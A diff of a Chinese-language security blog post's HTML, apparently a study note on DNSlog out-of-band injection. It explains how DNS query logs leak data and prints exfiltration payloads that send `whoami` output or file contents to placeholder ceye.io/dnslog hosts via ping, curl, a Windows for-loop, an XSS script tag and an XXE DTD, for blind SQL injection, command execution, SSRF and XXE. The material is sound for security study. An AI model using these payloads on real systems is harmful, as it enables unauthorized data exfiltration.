@@ -318,9 +318,9 @@
     <section class="article-content">
     
     
-    <h1 id="dnslog注入学习">DNSlog注入学习</h1>
-<h3 id="前置">前置</h3>
-<p><a class="link" href="https://blog.csdn.net/m0_37263637/article/details/85157611"  target="_blank" rel="noopener"
+    <h1 id="dnslog注入学习">DNSlog注入学习
+</h1><h3 id="前置">前置
+</h3><p><a class="link" href="https://blog.csdn.net/m0_37263637/article/details/85157611"  target="_blank" rel="noopener"
     >域名分级与域名解析过程(DNS)</a></p>
 <p>读完之后可以感受到，从用户到本地DNS服务器使用的是递归查询，递归的是本地DNS服务器帮你去迭代查询。</p>
 <p><figure 
@@ -337,13 +337,13 @@
 </figure></p>
 <p>其中，红色部分是可控的。我们只需要弄一个红色部分的DNS服务器，就得到DNS的解析日志。</p>
 <p>红色部分哪里来？自己搭建去（不一定），可以用下面的网站。</p>
-<h3 id="网站">网站</h3>
-<p><a class="link" href="http://www.dnslog.cn/"  target="_blank" rel="noopener"
+<h3 id="网站">网站
+</h3><p><a class="link" href="http://www.dnslog.cn/"  target="_blank" rel="noopener"
     >http://www.dnslog.cn/</a></p>
 <p><a class="link" href="http://ceye.io/"  target="_blank" rel="noopener"
     >http://ceye.io/</a></p>
-<h3 id="原理">原理</h3>
-<p><a class="link" href="https://www.cnblogs.com/Xy--1/p/12896599.html"  target="_blank" rel="noopener"
+<h3 id="原理">原理
+</h3><p><a class="link" href="https://www.cnblogs.com/Xy--1/p/12896599.html"  target="_blank" rel="noopener"
     >DNS注入</a></p>
 <p>上面这些讲的很清楚，这里再用自己的话总结一下，就以Sql的利用为例子：</p>
 <p>在权限（文件可读）、环境（secure_file_priv）、长度（max_allowed_packet）都满足的情况下，在通过LOAD-FILE等文件函数进行读写时，整了个UCN路径，UCN路径构建DNS服务器地址，假装访问文件，产生DNSlog，就是这个DNSlog可以夹带私货，比如</p>
@@ -366,14 +366,14 @@
 	</a>
 	
 </figure></p>
-<h3 id="利用">利用</h3>
-<p><a class="link" href="https://www.freebuf.com/column/184587.html"  target="_blank" rel="noopener"
+<h3 id="利用">利用
+</h3><p><a class="link" href="https://www.freebuf.com/column/184587.html"  target="_blank" rel="noopener"
     >使用DNSLOG拯救你的盲打盲注</a></p>
 <p><a class="link" href="http://www.admintony.com/DNSLog%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8.html"  target="_blank" rel="noopener"
     >DNSLog在渗透中的使用</a></p>
-<h4 id="1sql注入中的盲注">1.SQL注入中的盲注</h4>
-<h4 id="2无回显的命令执行">2.无回显的命令执行</h4>
-<p><strong>Linux</strong></p>
+<h4 id="1sql注入中的盲注">1.SQL注入中的盲注
+</h4><h4 id="2无回显的命令执行">2.无回显的命令执行
+</h4><p><strong>Linux</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> ping <span style="color:#f1fa8c">`</span>whoami<span style="color:#f1fa8c">`</span>.xxxx.ceye.io
 </span></span><span style="display:flex;"><span> curl http://haha.xxx.ceye.io/<span style="color:#f1fa8c">`</span>whoami<span style="color:#f1fa8c">`</span>
 </span></span></code></pre></div><p>像这里还有复杂点的，base64，多行输出等等</p>
@@ -385,12 +385,12 @@
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>获取计算机名：for /F <span style="color:#f1fa8c">&#34;delims=\&#34;</span> <span style="color:#8be9fd;font-style:italic">%i in (&#39;whoami&#39;) do ping -n 1 %</span>i.xxx.dnslog.link
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>获取用户名：for /F <span style="color:#f1fa8c">&#34;delims=\ tokens=2&#34;</span> <span style="color:#8be9fd;font-style:italic">%i in (&#39;whoami&#39;) do ping -n 1 %</span>i.xxx.dnslog.link
-</span></span></code></pre></div><h4 id="3无回显ssrf">3.无回显SSRF</h4>
-<p>基本是把url换成想要的SSRF.xxxx.ceye.io</p>
-<h4 id="4xss跨站">4.XSS跨站</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>script src<span style="color:#ff79c6">=</span>http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//XSS.XXXXX.ceye.io&gt;&lt;/script&gt;
-</span></span></span></code></pre></div><h4 id="5xxe">5.XXE</h4>
-<p>改dtd：</p>
+</span></span></code></pre></div><h4 id="3无回显ssrf">3.无回显SSRF
+</h4><p>基本是把url换成想要的SSRF.xxxx.ceye.io</p>
+<h4 id="4xss跨站">4.XSS跨站
+</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>script src<span style="color:#ff79c6">=</span>http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//XSS.XXXXX.ceye.io&gt;&lt;/script&gt;
+</span></span></span></code></pre></div><h4 id="5xxe">5.XXE
+</h4><p>改dtd：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dtd" data-lang="dtd"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;!ENTITY</span> % all
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;&lt;!ENTITY % send SYSTEM &#39;http://xxxx.ceye.io/%file;&#39;&gt;&#34;</span>
@@ -398,8 +398,8 @@
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>%all;
-</span></span></code></pre></div><h3 id="tips">Tips</h3>
-<p>**为什么要使用DNS注入？**同学面试的时候被问过，原话是：除了上述这些（报错，盲注等）注入，sql注入有没有啥快速跑出来的方法？</p>
+</span></span></code></pre></div><h3 id="tips">Tips
+</h3><p>**为什么要使用DNS注入？**同学面试的时候被问过，原话是：除了上述这些（报错，盲注等）注入，sql注入有没有啥快速跑出来的方法？</p>
 <p>盲注跑数据太慢的情况下，可以选择<strong>DNS</strong>注入。</p>
 
 </section>
@@ -435,7 +435,7 @@
     <aside class="related-contents--wrapper">
     
     
-        <h2 class="section-title">Related contents</h2>
+        <h2 class="section-title"></h2>
         <div class="related-contents">
             <div class="flex article-list--tile">
                 
